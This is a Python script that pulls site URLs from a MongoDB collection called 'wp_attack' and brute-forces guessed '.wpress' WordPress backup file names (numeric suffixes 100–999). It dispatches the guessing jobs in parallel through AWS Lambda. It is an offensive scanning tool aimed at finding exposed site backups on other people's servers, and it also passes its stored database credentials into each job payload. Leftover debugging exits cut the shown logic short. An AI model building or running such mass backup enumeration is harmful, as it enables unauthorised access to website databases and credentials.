import random
import pymongo
import requests
import json
import time

import boto3
lambda_client = boto3.client('lambda')

def chunk(l, n):
    for i in range(0, len(l), n): 
        yield l[i:i + n]

from dotenv import dotenv_values
config = dotenv_values(".env")

lambda_arn = config['lambda_arn']
db_ip = config['db_ip']
db_port = config['db_port']
db_client = config['db_client']
db_collection = config['db_collection']
username = config['username']
password = config['password']

client = pymongo.MongoClient(f"mongodb://{username}:{password}@{db_ip}:{db_port}/")
#client = pymongo.MongoClient(f"mongodb://{username}:{password}@localhost:{db_port}/")
db = client[db_client]
wp_attack = db[db_collection]


nurls_per_job=25
n=10
nurls=200


for ii in range(n):
    objs = list(wp_attack.aggregate([
        {'$sample': { 'size': nurls }},
        {'$match': {'$or':[{'ntries':0},{'response':429} ]}},
        #{'$match': {'ntries':0}},
        {'$sample': { 'size': nurls } }]))

    print (f"{ii}/50 :: got {len(objs)} urls")

    for obj in objs:
        url = obj['url']
        print (url)
        base_url = f"{url[:-10]}"
        
        _range = list(range(100,1000))
        random.shuffle(_range)

        payload = []
        for ii in _range:
            iurl = f"{base_url}{ii}.wpress"
            print (iurl)
            check = wp_attack.find({ 'url': iurl,'ntries':0})
            print (check.count())
            for item in list(check):
                print (item)
            exit(0)
            
            payload.append(ii)
            #if len(payload)>=nurls_per_job:
            #    break

        print (payload)
        print ("done")
        exit(0)
        url = f"{url}FUZZ.wpress"
        print (url)

        exit(0)

        break
    break
    for i in range(100,1000,nurls_per_job):
        j = i+nurls_per_job
        for obj in objs:
            url = obj['url']
            
            url = f"{url[:-10]}FUZZ.wpress"
            print (url,[i,j])
            data = json.dumps(dict(config,**{'url':url,'FUZZ':[i,j]}))
            
            response = lambda_client.invoke(
                FunctionName=lambda_arn,
                InvocationType='Event',
                Payload=data
            )
            time.sleep(0.5)
            #print (response)
            #if 'Payload' in response:
            #    print (response['Payload'].read())
                
        print ('finished',i,j)
        time.sleep(1)
